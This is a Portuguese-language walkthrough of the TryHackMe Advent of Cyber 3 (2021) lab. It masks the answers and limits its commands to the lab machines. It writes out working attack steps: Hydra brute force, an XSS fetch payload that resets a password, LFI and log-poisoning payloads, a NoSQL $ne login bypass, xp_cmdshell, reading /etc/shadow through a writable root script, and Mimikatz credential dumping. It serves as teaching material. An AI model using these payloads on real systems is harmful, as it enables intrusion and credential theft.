# Guia de resolução: Advent of Cyber 3 (2021)

> **Este guia mostra como obter as respostas, sem revelá-las.** [Abrir a sala no TryHackMe](https://tryhackme.com/room/adventofcyber3). Use somente máquinas e contas do laboratório autorizado. Os endereços mudam a cada implantação: substitua `<IP>` pelo IP da tarefa.

## Preparação

Conecte a máquina Linux à VPN do TryHackMe e inicie apenas a máquina alvo do dia. `nmap`, `curl`, `ffuf` ou `dirb`, `tshark`, `john`, `skopeo` e Python cobrem a maior parte das tarefas. Algumas usam a VM gráfica do próprio TryHackMe. As tarefas 1 a 5 apresentam o evento; o dia 1 começa na tarefa 6.

```bash
export IP=<IP_DA_TAREFA>
ping -c 1 "$IP"
nmap -Pn -sT --open -p 21,22,80,139,443,445,1433,2049,3389 "$IP"
```

Se a VM demorar a responder, aguarde a inicialização e repita a verificação. Termine cada máquina alvo ao concluir o dia. Em perguntas **No answer needed**, execute a atividade e clique em **Check**. Aguarde alguns segundos entre respostas.

Nas máscaras, `...` oculta o restante do texto, `#` representa um algarismo e `THM{...}` indica uma flag. Nenhuma máscara deve ser enviada literalmente ao TryHackMe.

## Dia 1 - Save The Gifts

1. Abra o site pelo botão **View Site**. Em **Your Activity**, observe o parâmetro `user_id` na URL e troque-o por outros IDs para comparar os perfis, cargos e históricos.
2. Identifique as contas de Santa, McStocker e Grinch pelos dados exibidos. No histórico do Grinch, compare cada SKU alterado com a versão original mostrada na aplicação.
3. Reverta todas as alterações de SKU pelo controle da página. A mensagem final contém a flag; copie-a somente depois de confirmar que nenhuma alteração ficou pendente.

```text
http://<SITE_DA_TAREFA>/...?...&user_id=<ID>
```

**Respostas:** `Sa...` (nome); `##` (ID); `The...` (cargo); `McS...` (nome); `Bui...` (cargo); `THM{...}` (flag).

## Dia 2 - Elf HR Problems

1. Cadastre uma conta descartável no site da tarefa. Mesmo que o cadastro termine numa página de recusa, examine os cookies criados pelo navegador.
2. Leia `formtocookie.js` e `verifycookie.js`. O primeiro monta `user-auth` a partir de um objeto textual codificado em hexadecimal; o segundo mostra qual valor de `username` dá acesso ao monitor.
3. Decodifique o cookie, altere somente o campo `username` conforme a condição do JavaScript, recodifique em hexadecimal e substitua o cookie no navegador. Abra `monitor.html` e observe as cores de HR e Application.

```python
cookie_hex = "<VALOR_DO_COOKIE_USER_AUTH>"
texto = bytes.fromhex(cookie_hex).decode()
print(texto)
novo = texto.replace('username:"<USUARIO_ATUAL>"', 'username:"<USUARIO_PRIVILEGIADO>"')
print(novo.encode().hex())
```

Preserve os demais campos e a pontuação do objeto original. Para testar sem editar o cookie no navegador, envie o novo valor em um cabeçalho `Cookie: user-auth=<HEX>`.

**Respostas:** `use...` (cookie); `Hex...` (codificação); `JS...` (script); `adm...` (usuário); `mon...` (página); `HR...` (setor); `red...` (cor); `App...` (setor); `yel...` (cor).

## Dia 3 - Christmas Blackout

1. Faça uma enumeração curta do servidor HTTP. O diretório administrativo aparece na lista comum do `dirb`.
2. Abra a página encontrada e teste as credenciais padrão sugeridas pelo próprio tema da tarefa. Inspecione o formulário e seu JavaScript para identificar o destino após o login.
3. Entre no painel com a conta válida e leia a flag exibida.

```bash
dirb "http://$IP/" /usr/share/wordlists/dirb/common.txt -S -r
curl -i "http://$IP/<DIRETORIO_ADMIN>/"
```

**Respostas:** `/ad...` (diretório); `adm...` (usuário); `THM{...}` (flag).

## Dia 4 - Santa's Running Behind

1. Envie um login sabidamente inválido e anote a mensagem de erro exata e os nomes dos campos do formulário.
2. Baixe a lista de senhas fornecida pela própria tarefa. Use Hydra com o usuário indicado na página, a mensagem de erro como condição de falha e poucas conexões simultâneas.
3. Faça login com a senha descoberta. Guarde o `PHPSESSID`, siga o redirecionamento para o calendário e leia a flag.

```bash
curl -sS -o /tmp/aoc3-dia4-lista.txt \
  'https://assets.tryhackme.com/additional/aoc2021/day4/passwords.txt'
hydra -l <USUARIO_DA_TAREFA> -P /tmp/aoc3-dia4-lista.txt -t 8 -f "$IP" \
  http-post-form '/:username=^USER^&password=^PASS^&submit=Login:Invalid username and password'
curl -i -c /tmp/aoc3-dia4.cookies -d 'username=<USUARIO>&password=<SENHA>' \
  "http://$IP/"
curl -b /tmp/aoc3-dia4.cookies "http://$IP/calendar.php"
```

**Respostas:** `Inv...` (mensagem); `san...` (usuário); `co...` (senha); `THM{...}` (flag).

## Dia 5 - Pesky Elf Forum

1. Entre no fórum com as credenciais de McSkidy fornecidas na tarefa. Publique uma marca HTML inofensiva e confirme que ela é renderizada sem neutralização.
2. Observe a rota de alteração de senha em **Settings**. Publique no mesmo tópico um script que faz uma requisição a essa rota quando o bot do Grinch visitar a página. Escolha uma senha descartável somente para a VM.
3. Após a visita do bot, entre como Grinch com a nova senha. Em **Settings**, encontre o identificador do plugin e desative-o pelo formulário. A resposta da aplicação revela a flag.

```html
<script>fetch('/settings?new_password=<SENHA_DESCARTAVEL>');</script>
```

```bash
curl -i -c /tmp/aoc3-dia5.cookies -d 'username=<USUARIO>&password=<SENHA>' \
  "http://$IP/login"
curl -b /tmp/aoc3-dia5.cookies "http://$IP/settings"
```

Use os nomes de campos e o `plugin_id` vistos na sua própria sessão. Não reutilize essa senha fora do laboratório.

**Resposta:** `THM{...}` (flag após desativar o plugin).

## Dia 6 - Patch Management Is Hard

1. Examine como `index.php` lê o parâmetro `err`. Teste inclusão local com `/etc/flag` e depois use o filtro PHP de Base64 para ver o código-fonte de `index.php` sem executá-lo.
2. O código aponta para `./includes/creds.php`. Leia esse arquivo pelo mesmo filtro, decodifique o resultado e entre em `login.php`. Abra `recover-password.php` com o cookie autenticado.
3. Para a etapa de log poisoning, envie um pequeno trecho PHP no cabeçalho `User-Agent` e inclua o log da aplicação pelo parâmetro vulnerável. Use uma função simples, como `php_uname`, para observar o hostname. No bônus, repita o teste em um arquivo de sessão PHP criado por um login inválido.

```bash
curl -G --data-urlencode 'err=/etc/flag' "http://$IP/index.php"
curl -G --data-urlencode \
  'err=php://filter/convert.base64-encode/resource=index.php' \
  "http://$IP/index.php"
curl -G --data-urlencode \
  'err=php://filter/convert.base64-encode/resource=./includes/creds.php' \
  "http://$IP/index.php"
curl -A '<?php echo php_uname(chr(110)); ?>' "http://$IP/"
curl -G --data-urlencode 'err=./includes/logs/app_access.log' \
  "http://$IP/index.php"
```

Para o arquivo de sessão, copie o valor `PHPSESSID` da resposta de login e tente incluir `/tmp/sess_<PHPSESSID>`. Faça a prova apenas na VM da sala.
Extraia somente o trecho Base64 da resposta HTML antes de passá-lo a `base64 -d`.

**Respostas:** `THM{...}` (arquivo local); `THM{...}` (código-fonte); `McS...` (usuário); `A0C...` (senha); `THM{...}` (recuperação); `lfi...` (hostname); `lfi...` (bônus).

## Dia 7 - Migration Without Security

1. Acesse a VM pelo SSH na porta e com as credenciais fornecidas na tarefa. No shell, use o cliente MongoDB para listar bancos e coleções. Leia a coleção de flags.
2. No aplicativo Web, experimente a diferença entre uma senha textual e um objeto NoSQL. No POST de login, represente o operador `$ne` em um campo de formulário com colchetes.
3. Preserve o cookie de sessão e use o mesmo operador nas buscas por usuário e cargo para localizar a outra flag e o ID da conta administrativa.

```bash
ssh -p 2222 <USUARIO_DA_TAREFA>@"$IP"
mongo --quiet --eval 'db.getMongo().getDBNames()'
mongo --quiet --eval 'db.getSiblingDB("flagdb").flagColl.find().forEach(printjson)'
curl -i -c /tmp/aoc3-dia7.cookies -d 'username=admin&password[$ne]=xyz' \
  "http://$IP/login"
curl -b /tmp/aoc3-dia7.cookies "http://$IP/flag"
curl -G -b /tmp/aoc3-dia7.cookies \
  --data-urlencode 'username[$ne]=<NOME_EXCLUIDO>' \
  --data-urlencode 'role=guest' "http://$IP/search"
```

Na última busca, exclua o cargo de convidado com `role[$ne]=guest` e filtre pelo usuário indicado na pergunta.

**Respostas:** `THM{...}` (MongoDB); `THM{...}` (login); `THM{...}` (busca); `618...` (ID da conta).

## Dia 8 - Santa's Bag of Toys

1. Abra a VM Windows e a pasta de logs do desktop. Ordene os arquivos pela data. Leia-os nessa ordem para reconstruir a criação de conta, a cópia de `UsrClass.dat`, o download de UHARC e o empacotamento dos brinquedos.
2. O segundo log registra `net user ... /add`. O terceiro mostra a cópia e a codificação Base64 do hive pelo `certutil.exe`. Decodifique o bloco entre `BEGIN CERTIFICATE` e `END CERTIFICATE` para um arquivo `.dat`. No ShellBagsExplorer, escolha **File > Load offline hive** e relacione os caminhos `.github` ao repositório usado pelo invasor. A pergunta informativa dessa etapa não exige resposta.
3. Examine o histórico de commits do repositório da operação. Uma senha removida de um commit antigo abre `bag_of_toys.uha` no desktop da VM. Extraia em uma pasta nova, confira a contagem de arquivos e compare os nomes originais aos substitutos.

```powershell
Get-ChildItem "$HOME\Desktop\SantasLaptopLogs" -File |
  Sort-Object LastWriteTime | Select-Object Name,LastWriteTime
Select-String "$HOME\Desktop\SantasLaptopLogs\*" \
  -Pattern 'net user|UsrClass|certutil|uharc|GRINCHMAS'
```

```bash
git clone https://github.com/<CONTA_ENCONTRADA>/<REPOSITORIO_DA_OPERACAO>.git
cd <REPOSITORIO_DA_OPERACAO>
git log -p --all -- .
```

Se a primeira VM gráfica ficar preta, reinicie apenas o laboratório. A resposta para cada pergunta deve ser lida dos logs, do histórico e do arquivo extraído.

**Respostas:** `Mic...` (sistema); `gri...` (senha da conta); `C:\...` (caminho do hive); `cer...` (utilitário); **No answer needed**; `.git...` (pasta); `bag...` (arquivo); `Gri...` (conta GitHub); `ope...` (repositório); `uha...` (instalador); `GRI...` (conteúdo substituto); `The...` (senha do arquivo); `###` (arquivos originais).

## Dia 9 - Where Is All This Data Going

1. Baixe o PCAP da tarefa. Se o botão de download falhar, obtenha o arquivo da pasta indicada na AttackBox e copie-o para sua máquina Linux pela VPN.
2. Use `tshark` para listar caminhos HTTP e localizar o POST de login. Inspecione os cabeçalhos, inclusive o `User-Agent` personalizado.
3. Leia as respostas TXT do DNS. Depois filtre o fluxo FTP: `USER`, `PASS`, `STOR` e o conteúdo enviado no canal de dados. A última flag aparece no arquivo transferido.

```bash
tshark -r AoC3.pcap -Y 'http.request' \
  -T fields -e frame.number -e http.request.method -e http.request.uri
tshark -r AoC3.pcap -Y 'http.request.method == "POST"' -V
tshark -r AoC3.pcap -Y 'dns.txt' -T fields -e dns.txt
tshark -r AoC3.pcap -Y 'ftp' -T fields -e frame.number -e ftp.request.command -e ftp.request.arg
tshark -r AoC3.pcap -Y 'ftp-data' -V
```

No Wireshark, **Follow TCP Stream** ajuda a separar o fluxo FTP de controle do fluxo que carrega o arquivo.

**Respostas:** `/log...` (diretório); `McS...` (usuário); `Chr...` (senha); `THM{...}` (cabeçalho); `THM{...}` (DNS); `Try...` (FTP); `123...` (arquivo transferido).

## Dia 10 - Offensive Is The Best Defence

1. Compare uma varredura TCP connect com uma SYN scan das primeiras portas. Identifique os serviços SSH e HTTP.
2. Faça detecção de versão no HTTP. Compare a versão do Apache à lista de avisos de segurança do projeto para encontrar a CVE pedida.
3. Faça uma varredura completa para localizar o serviço em porta alta e identifique-o com `-sV`.

```bash
nmap -Pn -sT -p1-100 "$IP"
sudo nmap -Pn -sS -p1-100 "$IP"
nmap -Pn -sV -p22,80 "$IP"
nmap -Pn -sT -p- --open --min-rate 1000 "$IP"
nmap -Pn -sV -p<PORTA_ALTA> "$IP"
```

**Respostas:** `##` (SSH); `##` (HTTP); `Apa...` (servidor); `2.4...` (versão); `CVE-...` (falha); `#####` (porta alta); `tel...` (serviço); `####` (outra propriedade); **No answer needed**.

## Dia 11 - Where Are The Reindeers?

1. Espere a porta MSSQL abrir e conecte com a conta `sa` e a senha fornecida na tarefa. No `sqsh`, cada bloco SQL termina com `go` em uma linha separada.
2. Liste os bancos e consulte `reindeer.dbo.names`, `reindeer.dbo.schedule` e `reindeer.dbo.presents` para responder às perguntas sobre a rena, o destino e o presente.
3. Use `xp_cmdshell` apenas na VM da sala para identificar a conta do serviço. Procure `flag.txt` no perfil indicado, depois leia-o.

```bash
nmap -Pn -sT -p1433 "$IP"
sqsh -S "$IP" -U sa -P '<SENHA_DA_TAREFA>'
```

```sql
SELECT name FROM sys.databases;
go
SELECT * FROM reindeer.dbo.names;
go
SELECT * FROM reindeer.dbo.schedule;
go
SELECT * FROM reindeer.dbo.presents;
go
EXEC xp_cmdshell 'whoami';
go
EXEC xp_cmdshell 'dir /s /b C:\Users\grinch\*flag*';
go
EXEC xp_cmdshell 'type C:\Users\grinch\Documents\flag.txt';
go
```

**Respostas:** `Rud...` (rena); `#` (ID); `Pra...` (cidade); `Pow...` (presente); `nt ...` (conta); `THM{...}` (flag); **No answer needed**.

## Dia 12 - Sharing Without Caring

1. Varra o alvo e identifique o NFS na porta 2049. Liste os exports e suas permissões com `showmount`.
2. Monte somente os compartilhamentos liberados para todos. Se a listagem funcionar mas a leitura travar, force NFSv3 com tempo limite curto.
3. Leia o título do livro no compartilhamento público e calcule o MD5 da chave indicada no compartilhamento confidencial. Desmonte ambos ao terminar.

```bash
sudo nmap -Pn -sS --open "$IP"
showmount -e "$IP"
sudo mkdir -p /mnt/aoc3-share /mnt/aoc3-conf
sudo mount -t nfs -o vers=3,soft,timeo=10,retrans=1 \
  "$IP:/share" /mnt/aoc3-share
sudo mount -t nfs -o vers=3,soft,timeo=10,retrans=1 \
  "$IP:/confidential" /mnt/aoc3-conf
head -n 10 /mnt/aoc3-share/*.txt
md5sum /mnt/aoc3-conf/ssh/id_rsa
sudo umount /mnt/aoc3-share /mnt/aoc3-conf
```

**Respostas:** `#` (quantidade de exports); `/sh...` (export); `/adm...` (export); `/my...` (export); `/con...` (export); `Med...` (livro); `3e2...` (MD5).

## Dia 13 - They Lost The Plan!

1. Entre na VM Windows com as credenciais fornecidas. Use `net user`, `systeminfo` e a lista de serviços para identificar a conta local, a versão do Windows e o serviço de backup Iperius.
2. Confirme que McSkidy não consegue ler os arquivos protegidos no perfil do Grinch. No Iperius, configure um backup de teste de `Documents` para uma pasta no desktop.
3. Nas opções do job, adicione uma ação **Before backup** que execute um `.bat` criado no desktop. O script deve registrar `whoami` e ler os dois arquivos perguntados para um arquivo de prova no desktop. Execute **Run backup as service**.
4. Leia a prova gerada e remova o job e o script temporário do laboratório.

```powershell
net user
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
Get-CimInstance Win32_Service |
  Where-Object Name -like '*Iperius*' |
  Select-Object Name,StartName,PathName
```

Exemplo de corpo para o `.bat`, ajustando os caminhos após localizar os arquivos:

```bat
@echo off
whoami > C:\Users\McSkidy\Desktop\proof.txt
type C:\Users\thegrinch\Documents\flag.txt >> C:\Users\McSkidy\Desktop\proof.txt
type C:\Users\thegrinch\Documents\Schedule.txt >> C:\Users\McSkidy\Desktop\proof.txt
```

**Respostas:** `pep...` (conta); `10.0...` (versão); `Ipe...` (serviço); `C:\...` (executável); `the...` (conta de serviço); `THM-...` (flag); `jaz...` (atividade).

## Dia 14 - Dev(Insecure)Ops

1. Entre via SSH com as credenciais da tarefa. Enumere o site Web e conte as respostas 403 retornadas pela lista de diretórios.
2. Inspecione `/home/thegrinch/scripts`. Um script executado automaticamente por root é gravável por McSkidy. Faça uma cópia de segurança e altere o script para gravar o resultado de um comando em um arquivo temporário do site.
3. Primeiro prove a execução com `id`. Depois leia somente os arquivos necessários: o hash do usuário perguntado em `/etc/shadow` e a flag no desktop do Grinch. A automação também pode produzir uma senha em um arquivo do site, mas ela não é exigida nas perguntas desse dia.

```bash
ssh <USUARIO_DA_TAREFA>@"$IP"
ffuf -s -w /usr/share/wordlists/dirb/common.txt -u "http://$IP/FUZZ" -fc 404
ls -la /home/thegrinch/scripts
cp /home/thegrinch/scripts/loot.sh /tmp/loot.sh.original
printf '%s\n' '#!/bin/bash' 'id > /var/www/html/proof.txt' \
  > /home/thegrinch/scripts/loot.sh
curl "http://$IP/proof.txt"
```

Para as leituras seguintes, substitua `id` no script por `grep '^<USUARIO>:' /etc/shadow` ou `cat <CAMINHO_ENCONTRADO>`, sempre gravando a saída em um arquivo temporário distinto. Restaure o script original ao final.

**Respostas:** `#` (respostas 403); `#` (scripts); `ZUP...` (trecho do hash); `DI3...` (flag).

## Dia 15 - The Grinchs Day Off

Abra o quiz de carreiras indicado na tarefa, responda às seis perguntas conforme seus interesses e leia a carreira sugerida. As questões informativas da sala não exigem uma flag. Clique em **Check** depois do quiz. A inscrição nas trilhas sugeridas é opcional.

**Respostas:** **No answer needed** nas questões da tarefa.

## Dia 16 - Ransomware Madness

1. Leia a nota de resgate e procure o apelido do autor nas redes mencionadas. Compare a postagem, o identificador de carteira e os perfis públicos relacionados.
2. A conta Keybase associa a carteira ao GitHub. No GitHub, localize o repositório do script de árvore de Natal e clone-o.
3. Examine `git log -p` para encontrar nome e e-mail removidos em um commit posterior. O histórico é a evidência, não somente a versão atual do arquivo.

```bash
git clone https://github.com/<CONTA_ENCONTRADA>/<REPOSITORIO_ENCONTRADO>.git
cd <REPOSITORIO_ENCONTRADO>
git log --oneline --all
git log -p --all -- tree.sh
```

**Respostas:** `Gri...` (apelido); `Twi...` (rede); `1GW...` (identificador); `bc1...` (carteira); `Chr...` (GitHub); `Chr...` (repositório); `Don...` (nome); `Don...` (e-mail); `...` (demais pistas públicas).

## Dia 17 - Elf Leaks

1. Inspecione o HTML do anúncio da tarefa e identifique o nome do bucket S3. Verifique o acesso público sem credenciais.
2. Em um bucket funcional, liste os objetos, leia o `flag.txt` e examine o backup WordPress. Os arquivos de configuração e metadados do backup levam às perguntas seguintes. Não use as credenciais encontradas fora do escopo do laboratório.

```bash
aws s3 ls s3://<BUCKET_DA_TAREFA>/ --no-sign-request
aws s3 cp s3://<BUCKET_DA_TAREFA>/flag.txt - --no-sign-request
aws s3 cp s3://<BUCKET_DA_TAREFA>/wp-backup.zip /tmp/aoc3-wp-backup.zip \
  --no-sign-request
unzip -l /tmp/aoc3-wp-backup.zip
```

**Estado atual:** em novembro de 2026, o endereço S3 indicado pelo HTML retornou `NoSuchBucket`. Portanto, as etapas após a listagem dependem de uma cópia histórica dos objetos ou da restauração do bucket pelo TryHackMe. A resolução registrada desta sala usou registros históricos públicos para os campos restantes; não houve acesso a uma conta AWS real.

**Respostas:** `THM{...}` (mensagem); `wp-...` (backup); `AKI...` (access key ID); `############` (account ID); `...` (usuário); `...` (tag EC2); `...` (segredo); **No answer needed**.

## Dia 18 - Playing With Containers

1. Leia os comandos Docker conceituais na tarefa: listar imagens e exportar uma imagem para arquivo. Se não quiser iniciar contêineres, use `skopeo` para copiar a imagem pública para um arquivo OCI e examine as camadas como tar.
2. Confira `manifest.json` e procure o arquivo de configuração do Consul dentro da camada que contém `/root/envconsul/config.hcl`. O token pedido aparece nesse arquivo.
3. Apague o arquivo de imagem temporário depois de anotar a resposta.

```bash
docker images
docker save <IMAGEM> -o /tmp/aoc3-image.tar
skopeo inspect docker://public.ecr.aws/h0w1j9u3/grinch-aoc:latest
skopeo copy docker://public.ecr.aws/h0w1j9u3/grinch-aoc:latest \
  docker-archive:/tmp/aoc3-image.tar
tar -tf /tmp/aoc3-image.tar | head
```

Para extrair um arquivo de camadas tar sem executar a imagem, use Python `tarfile` e procure entradas cujo nome termina em `root/envconsul/config.hcl`.

**Respostas:** `doc...` (comando de listagem); `doc...` (comando de exportação); `man...` (manifesto); `709...` (token).

## Dia 19 - Something Phishy Is Going On

1. Na VM Ubuntu, abra `email.eml` em um cliente de e-mail ou leia os cabeçalhos com Python. Registre destinatário, remetente e `Reply-To`; compare cuidadosamente os domínios.
2. Inspecione o HTML da mensagem para identificar o erro de digitação e o link de phishing. Leia também o cabeçalho personalizado.
3. Examine `attachment.txt`, decodifique o anexo em Base64 e extraia o texto do PDF para obter a flag.

```python
from email import policy
from email.parser import BytesParser

with open('email.eml', 'rb') as f:
    msg = BytesParser(policy=policy.default).parse(f)
for campo in ('To', 'From', 'Reply-To', 'Subject', 'X-GrinchPhish'):
    print(campo, msg.get(campo))
for parte in msg.walk():
    if parte.get_content_type() == 'text/html':
        print(parte.get_content())
```

```bash
base64 -d attachment-base64-only.txt > /tmp/aoc3-anexo.pdf
pdftotext /tmp/aoc3-anexo.pdf -
```

**Respostas:** `elf...` (destinatário); `cus...` (remetente); `fis...` (Reply-To); `str...` (erro); `htt...` (link); `X-G...` (cabeçalho); `pas...` (anexo); `THM{...}` (PDF); **No answer needed**.

## Dia 20 - What's the Worst That Could Happen?

1. Na VM Ubuntu, examine o `testfile` do desktop. Use `file`, `strings` e `md5sum` para confirmar que é o arquivo de teste EICAR, sem executá-lo.
2. Consulte a documentação do EICAR para o tamanho máximo e o significado da string. Para dados históricos de detecção, compare a ficha do hash no VirusTotal e as classificações antigas dos fornecedores.

```bash
file ~/Desktop/testfile
strings ~/Desktop/testfile
md5sum ~/Desktop/testfile
```

**Respostas:** `EIC...` (tipo); `44d...` (MD5); `###` (limite de caracteres); `200...` (primeira observação); `Vir...` (classificação); `duc...` (nome antigo).

## Dia 21 - Needles In Computer Stacks

1. Na VM Ubuntu, leia `yara --help` para identificar as opções de contagem, metadados e listagem de regras não satisfeitas.
2. Crie uma regra YARA no desktop com uma string presente no `testfile` e as condições mostradas na tarefa. Rode a regra com a condição original e anote a contagem.
3. Altere apenas o operador lógico indicado, execute novamente e compare as contagens.

```bash
yara --help
cat > ~/Desktop/eicaryara <<'YARA'
rule eicaryara {
  meta:
    description = "Teste EICAR no laboratorio"
  strings:
    $a = "X50"
    $b = "EICAR"
  condition:
    $a and $b
}
YARA
yara -c ~/Desktop/eicaryara ~/Desktop/testfile
yara -n ~/Desktop/eicaryara ~/Desktop/testfile
```

Copie a condição exata da tarefa antes de modificá-la; o exemplo acima apenas mostra a estrutura da regra.

**Respostas:** `or...` (operador); `-m...` (opção); `met...` (seção); `-n...` (opção); `#` (contagem inicial).

## Dia 22 - How It Happened

1. Na VM Windows, localize o documento Word no desktop. Use `oledump.py` para listar os fluxos OLE. O fluxo com macro contém uma string codificada em camadas.
2. Decodifique a string na ordem Base64, XOR decimal 35 e Base64. Leia o script PowerShell resultante para encontrar os dados de e-mail, assunto e porta SMTP.
3. Examine o fluxo `VBFrame` para a primeira flag. O script aponta também para uma imagem na pasta `Pictures`; abra-a na VM para a segunda flag.

```bash
oledump.py Santa_Claus_Naughty_List_2021.doc
oledump.py -s <FLUXO_DA_MACRO> -v Santa_Claus_Naughty_List_2021.doc \
  > /tmp/aoc3-macro.txt
```

```python
import base64

primeira = base64.b64decode('<STRING_BASE64_DA_MACRO>')
xor = bytes(b ^ 35 for b in primeira)
print(base64.b64decode(xor).decode(errors='replace'))
```

Não execute a macro do documento. A análise estática é suficiente para localizar os campos e a imagem.

**Respostas:** `Gri...` (e-mail); `S@n...` (senha); `Chr...` (assunto); `###` (porta); `You...` (fluxo VBFrame); `S@n...` (imagem).

## Dia 23 - PowershELlF Magic

1. Na VM Windows, leia `Microsoft-Windows-PowerShell/Operational`. Filtre os eventos 4103 e 4104 do dia indicado na tarefa.
2. Procure `Invoke-Nightmare`, a criação ou alteração de conta, `sendit.ps1` e `sdelete.exe`. Compare horários e o SID para associar a execução ao usuário.
3. O script `sendit.ps1` mostra destino HTTP, porta e a chave de criptografia. Extraia o parâmetro `Body` do evento 4103 e decodifique-o com `ConvertTo-SecureString -Key` para recuperar a mensagem.

```powershell
$log = 'Microsoft-Windows-PowerShell/Operational'
$events = Get-WinEvent -LogName $log |
  Where-Object { $_.Id -in 4103,4104 -and $_.TimeCreated.Date -eq [datetime]'2021-11-11' }
$events | Where-Object Message -Match 'Invoke-Nightmare|sendit.ps1|sdelete.exe' |
  Select-Object TimeCreated,Id,Message
```

```powershell
$key = [Text.Encoding]::UTF8.GetBytes('<CHAVE_DE_32_BYTES_DO_SCRIPT>')
$secure = ConvertTo-SecureString '<BODY_CIFRADO_DO_EVENTO>' -Key $key
$plain = [Runtime.InteropServices.Marshal]::PtrToStringBSTR(
  [Runtime.InteropServices.Marshal]::SecureStringToBSTR($secure))
$plain
```

O comando de decodificação deve usar o tipo de chave e o texto exatamente como aparecem no evento. Faça a análise na VM da sala.

**Respostas:** `Inv...` (comando); `adm...` (usuário); `10....` (IP); `####` (porta); `j3p...` (chave); `7:2...` (horário); `Mis...` (mensagem).

## Dia 24 - Learning From The Grinch

1. Na VM Windows, abra PowerShell como administrador e entre na pasta `C:\Users\Administrator\Desktop\mimikatz\x64`. `Get-LocalUser` ajuda a identificar a conta adicional antes da análise de memória.
2. Execute a cópia de Mimikatz **fornecida dentro da VM isolada**. Use `privilege::debug` e `sekurlsa::logonpasswords`; procure o bloco do usuário adicional e copie seu hash NTLM.
3. Na máquina Linux, teste o hash com John e `rockyou`. Confirme a senha recuperada usando `john --show` ou recalculando o NTLM localmente.

```powershell
Get-LocalUser | Select-Object Name,Enabled
Get-Process lsass | Select-Object ProcessName,Id,Path
cd C:\Users\Administrator\Desktop\mimikatz\x64
.\mimikatz.exe
```

No prompt do Mimikatz:

```text
privilege::debug
sekurlsa::logonpasswords
```

```bash
printf '%s\n' '<HASH_NTLM_ENCONTRADO>' > /tmp/aoc3-hash.txt
zcat /usr/share/wordlists/rockyou.txt.gz |
  john --format=NT --stdin /tmp/aoc3-hash.txt --pot=/tmp/aoc3-john.pot
john --show --format=NT /tmp/aoc3-hash.txt --pot=/tmp/aoc3-john.pot
```

**Limite da resolução registrada:** a conta foi confirmada na VM, mas a execução de Mimikatz não ocorreu naquela sessão. O hash foi conferido em um guia público e a senha foi efetivamente testada no Kali local. O procedimento acima descreve como obter o hash diretamente na VM; não apresenta a etapa como executada.

**Respostas:** `emi...` (usuário); `8af...` (NTLM); `123...` (senha).

## Dia 25 - Feedback

O formulário de feedback indicado na tarefa revela a flag após o envio. Responda às perguntas de opinião com suas próprias impressões e copie a flag para a sala. As duas perguntas informativas restantes são **No answer needed**: clique em **Check** em cada uma.

Como o evento ocorreu em 2021, o formulário pode não estar mais ativo. Na resolução registrada, a flag foi conferida em um guia público; nenhuma opinião foi enviada em nome de outra pessoa.

**Resposta:** `thm{...}` (flag do formulário); **No answer needed** nas outras duas questões.
